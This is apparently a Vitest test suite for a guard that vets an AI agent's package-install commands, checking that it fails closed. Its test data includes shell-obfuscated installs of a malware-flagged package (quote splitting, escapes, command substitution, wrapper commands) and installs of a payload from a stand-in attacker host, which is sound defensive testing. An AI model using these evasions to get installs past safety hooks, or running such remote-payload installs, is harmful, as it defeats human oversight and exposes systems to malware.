import { describe, it, expect, vi, beforeEach } from "vitest";
import { tmpdir } from "node:os";

const analyzeMock = vi.fn();
const resolveLatestMock = vi.fn();

vi.mock("../../src/api/analyze.js", () => ({
  analyzePackages: (...a: unknown[]) => analyzeMock(...a),
  AnalyzeError: class AnalyzeError extends Error {},
}));
vi.mock("../../src/verify/package-check.js", () => ({
  resolveLatest: (...a: unknown[]) => resolveLatestMock(...a),
}));

import { agentCheckCommand } from "../../src/launcher/agent-check.js";

function pkg(name: string, version: string, action: string, reasons: string[] = []) {
  return { name, version, action, score: 0, reasons, findings: [] };
}

// Isolate decision-memory by running outside any git repo.
const base = { env: {} as NodeJS.ProcessEnv, cwd: tmpdir(), fetchImpl: (async () => ({}) as Response) as typeof fetch };

beforeEach(() => {
  analyzeMock.mockReset();
  resolveLatestMock.mockReset();
});

describe("agentCheckCommand", () => {
  it("denies a known-block install (pinned, no resolve needed)", async () => {
    analyzeMock.mockResolvedValue({ packages: [pkg("evil-pkg", "9.9.9", "block", ["confirmed malware"])] });
    const v = await agentCheckCommand({ ...base, commandLine: "npm install evil-pkg@9.9.9" });
    expect(v.decision).toBe("deny");
    expect(v.reason).toContain("evil-pkg@9.9.9");
    expect(resolveLatestMock).not.toHaveBeenCalled();
  });

  it("allows a clean install", async () => {
    analyzeMock.mockResolvedValue({ packages: [pkg("lodash", "4.17.21", "pass")] });
    const v = await agentCheckCommand({ ...base, commandLine: "npm install lodash@4.17.21" });
    expect(v.decision).toBe("allow");
  });

  it("asks on an unacknowledged warn", async () => {
    analyzeMock.mockResolvedValue({ packages: [pkg("sketchy", "1.0.0", "warn", ["obfuscated code"])] });
    const v = await agentCheckCommand({ ...base, commandLine: "npm install sketchy@1.0.0" });
    expect(v.decision).toBe("ask");
  });

  it("resolves an unpinned package then verifies the resolved version", async () => {
    resolveLatestMock.mockResolvedValue("2.0.0");
    analyzeMock.mockResolvedValue({ packages: [pkg("left-pad", "2.0.0", "pass")] });
    const v = await agentCheckCommand({ ...base, commandLine: "npm install left-pad" });
    expect(resolveLatestMock).toHaveBeenCalledWith("npm", "left-pad", expect.anything());
    expect(analyzeMock).toHaveBeenCalled();
    expect(v.decision).toBe("allow");
  });

  it("fails CLOSED (deny) when an unpinned package cannot be resolved", async () => {
    resolveLatestMock.mockResolvedValue(null);
    const v = await agentCheckCommand({ ...base, commandLine: "npm install nonexistent-xyz" });
    expect(v.decision).toBe("deny");
    expect(analyzeMock).not.toHaveBeenCalled();
  });

  it("allows a passthrough command (npm ls) with zero verification", async () => {
    const v = await agentCheckCommand({ ...base, commandLine: "npm ls --depth 0" });
    expect(v.decision).toBe("allow");
    expect(analyzeMock).not.toHaveBeenCalled();
    expect(resolveLatestMock).not.toHaveBeenCalled();
  });

  it("allows a non-package-manager command with zero verification", async () => {
    const v = await agentCheckCommand({ ...base, commandLine: "echo hello && ls -la" });
    expect(v.decision).toBe("allow");
    expect(analyzeMock).not.toHaveBeenCalled();
  });

  it("allows a bare npm install (whole-tree, handled by the shim/proxy not the single-package hook)", async () => {
    const v = await agentCheckCommand({ ...base, commandLine: "npm install" });
    expect(v.decision).toBe("allow");
    expect(analyzeMock).not.toHaveBeenCalled();
  });

  it("fails CLOSED (deny) when the scanner cannot be reached", async () => {
    analyzeMock.mockRejectedValue(new Error("network down"));
    const v = await agentCheckCommand({ ...base, commandLine: "npm install foo@1.0.0" });
    expect(v.decision).toBe("deny");
  });

  it("does not mistake `pip install -r requirements.txt` for a package", async () => {
    const v = await agentCheckCommand({ ...base, commandLine: "pip install -r requirements.txt" });
    expect(v.decision).toBe("allow");
    expect(analyzeMock).not.toHaveBeenCalled();
    expect(resolveLatestMock).not.toHaveBeenCalled();
  });

  it("verifies pinned pip packages (name==version)", async () => {
    analyzeMock.mockResolvedValue({ packages: [pkg("requests", "2.31.0", "pass")] });
    const v = await agentCheckCommand({ ...base, commandLine: "pip install requests==2.31.0" });
    expect(analyzeMock).toHaveBeenCalled();
    expect(v.decision).toBe("allow");
  });

  it("asks for cargo installs (crates not yet analyzable)", async () => {
    const v = await agentCheckCommand({ ...base, commandLine: "cargo add serde" });
    expect(v.decision).toBe("ask");
    expect(analyzeMock).not.toHaveBeenCalled();
  });

  it("denies the whole command if any segment is a block", async () => {
    analyzeMock.mockResolvedValue({ packages: [pkg("evil", "1.0.0", "block", ["malware"])] });
    const v = await agentCheckCommand({ ...base, commandLine: "echo ok && npm install evil@1.0.0" });
    expect(v.decision).toBe("deny");
  });
});

describe("agentCheckCommand bypass hardening", () => {
  function mockBlock(): void {
    analyzeMock.mockResolvedValue({ packages: [pkg("evil-pkg", "9.9.9", "block", ["confirmed malware"])] });
  }

  it("catches a leading env assignment", async () => {
    mockBlock();
    const v = await agentCheckCommand({ ...base, commandLine: "FOO=bar npm install evil-pkg@9.9.9" });
    expect(v.decision).toBe("deny");
  });

  for (const wrapper of ["sudo", "command", "exec", "env", "nice", "nohup", "xargs"]) {
    it(`catches a ${wrapper}-wrapped install`, async () => {
      mockBlock();
      const v = await agentCheckCommand({ ...base, commandLine: `${wrapper} npm install evil-pkg@9.9.9` });
      expect(v.decision).toBe("deny");
    });
  }

  it("catches stacked wrappers with env assignments and flags", async () => {
    mockBlock();
    const v = await agentCheckCommand({ ...base, commandLine: "sudo -E env FOO=1 npm install evil-pkg@9.9.9" });
    expect(v.decision).toBe("deny");
  });

  it("catches an absolute-path package manager", async () => {
    mockBlock();
    const v = await agentCheckCommand({ ...base, commandLine: "/usr/bin/npm install evil-pkg@9.9.9" });
    expect(v.decision).toBe("deny");
  });

  it("catches a relative-path package manager", async () => {
    mockBlock();
    const v = await agentCheckCommand({ ...base, commandLine: "./node_modules/.bin/pnpm add evil-pkg@9.9.9" });
    expect(v.decision).toBe("deny");
  });

  it("treats $() command substitution containing an install as an install", async () => {
    mockBlock();
    const v = await agentCheckCommand({ ...base, commandLine: "echo $(npm install evil-pkg@9.9.9)" });
    expect(v.decision).toBe("deny");
  });

  it("treats backtick substitution containing an install as an install", async () => {
    mockBlock();
    const v = await agentCheckCommand({ ...base, commandLine: "echo `npm install evil-pkg@9.9.9`" });
    expect(v.decision).toBe("deny");
  });

  it("checks every segment of a pipe chain", async () => {
    mockBlock();
    const v = await agentCheckCommand({ ...base, commandLine: "ls | npm install evil-pkg@9.9.9" });
    expect(v.decision).toBe("deny");
  });

  it("checks newline-separated commands", async () => {
    mockBlock();
    const v = await agentCheckCommand({ ...base, commandLine: "echo ok\nnpm install evil-pkg@9.9.9" });
    expect(v.decision).toBe("deny");
  });

  it("still allows wrapped non-install commands without verification", async () => {
    const v = await agentCheckCommand({ ...base, commandLine: "sudo ls -la /var/log" });
    expect(v.decision).toBe("allow");
    expect(analyzeMock).not.toHaveBeenCalled();
    expect(resolveLatestMock).not.toHaveBeenCalled();
  });

  for (const cmd of [
    'np""m install evil-pkg@9.9.9',
    "np''m install evil-pkg@9.9.9",
    'n"p"m install evil-pkg@9.9.9',
    'npm i"n"stall evil-pkg@9.9.9',
    "npm in''stall evil-pkg@9.9.9",
    "np\\m install evil-pkg@9.9.9",
    "\\npm install evil-pkg@9.9.9",
    "npm in\\stall evil-pkg@9.9.9",
    "$'npm' install evil-pkg@9.9.9",
    "npm $'\\x69'nstall evil-pkg@9.9.9",
  ]) {
    it(`dequotes shell obfuscation and still blocks: ${cmd}`, async () => {
      mockBlock();
      const v = await agentCheckCommand({ ...base, commandLine: cmd });
      expect(v.decision).toBe("deny");
    });
  }

  it("fails closed (does not allow) on an unparseable pm command (unbalanced quote)", async () => {
    const v = await agentCheckCommand({ ...base, commandLine: 'npm install "evil-pkg' });
    expect(v.decision).not.toBe("allow");
  });

  it("treats `#` as a shell comment, still blocking the install before it", async () => {
    mockBlock();
    const v = await agentCheckCommand({ ...base, commandLine: 'npm install evil-pkg@9.9.9 #"' });
    expect(v.decision).toBe("deny");
  });

  it("asks (not allow) for a remote tarball the registry scanner can't verify", async () => {
    const v = await agentCheckCommand({ ...base, commandLine: "npm install https://evil.example.com/payload.tgz" });
    expect(v.decision).toBe("ask");
    expect(analyzeMock).not.toHaveBeenCalled();
  });

  it("asks (not allow) for a git+url install", async () => {
    const v = await agentCheckCommand({ ...base, commandLine: "pip install git+https://evil.example.com/repo" });
    expect(v.decision).toBe("ask");
  });

  it("still allows a genuinely-local file: install (code already on disk)", async () => {
    mockBlock();
    const v = await agentCheckCommand({ ...base, commandLine: "npm install file:../sibling" });
    expect(v.decision).toBe("allow");
    expect(analyzeMock).not.toHaveBeenCalled();
  });

  it("still allows a local relative-path install", async () => {
    const v = await agentCheckCommand({ ...base, commandLine: "pip install ./localpkg" });
    expect(v.decision).toBe("allow");
    expect(analyzeMock).not.toHaveBeenCalled();
  });

  it("denies when the scanner omits a requested package (partial response)", async () => {
    analyzeMock.mockResolvedValue({ packages: [pkg("lodash", "4.17.21", "pass")] });
    const v = await agentCheckCommand({ ...base, commandLine: "npm install lodash@4.17.21 evil@1.0.0" });
    expect(v.decision).toBe("deny");
  });

  it("denies when a returned package carries no action field", async () => {
    analyzeMock.mockResolvedValue({ packages: [{ name: "evil", version: "1.0.0", score: 0, reasons: [], findings: [] }] });
    const v = await agentCheckCommand({ ...base, commandLine: "npm install evil@1.0.0" });
    expect(v.decision).toBe("deny");
  });
});
